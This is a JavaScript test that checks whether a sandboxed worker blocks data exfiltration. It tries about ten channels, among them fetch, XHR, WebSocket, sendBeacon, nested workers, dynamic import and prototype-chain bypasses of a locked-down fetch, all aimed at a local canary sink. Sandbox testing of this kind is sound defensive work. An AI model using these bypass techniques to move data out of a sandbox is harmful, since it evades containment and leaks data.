// Planted exfiltration test: every path must fail loudly and send nothing.
const SINK = 'http://127.0.0.1:8001/hit?d=LYNCEUS_CANARY_JS-';
const results = {};
async function attempt(name, fn) {
  try { await fn(); results[name] = 'NOT BLOCKED'; }
  catch (e) { results[name] = 'blocked: ' + (e && e.message || e); }
}
test('every exfiltration path is blocked', async () => {
  await attempt('fetch', () => fetch(SINK + 'fetch'));
  await attempt('XMLHttpRequest', () => { const x = new XMLHttpRequest(); x.open('GET', SINK + 'xhr', false); x.send(); });
  await attempt('WebSocket', () => new WebSocket('ws://127.0.0.1:8001/ws'));
  await attempt('EventSource', () => new EventSource(SINK + 'es'));
  await attempt('importScripts', () => importScripts(SINK + 'importscripts'));
  await attempt('navigator.sendBeacon', () => { if (!navigator.sendBeacon) throw new Error('not present in workers'); navigator.sendBeacon(SINK + 'beacon', 'x'); });
  await attempt('nested Worker', () => new Worker(URL.createObjectURL(new Blob(['fetch("' + SINK + 'nested")']))));
  await attempt('prototype bypass fetch', () => Object.getPrototypeOf(Object.getPrototypeOf(self)).fetch.call(self, SINK + 'protofetch'));
  await attempt('dynamic import()', () => import('http://127.0.0.1:8001/hit.js?d=LYNCEUS_CANARY_JS-import'));
  await attempt('constructor walk fetch', () => self.constructor.prototype.__proto__.fetch.call(self, SINK + 'ctorfetch'));
  console.log('EXFIL_RESULTS ' + JSON.stringify(results));
  const leaked = Object.entries(results).filter(([, v]) => v === 'NOT BLOCKED');
  if (leaked.length) throw new Error('not blocked: ' + JSON.stringify(leaked));
});
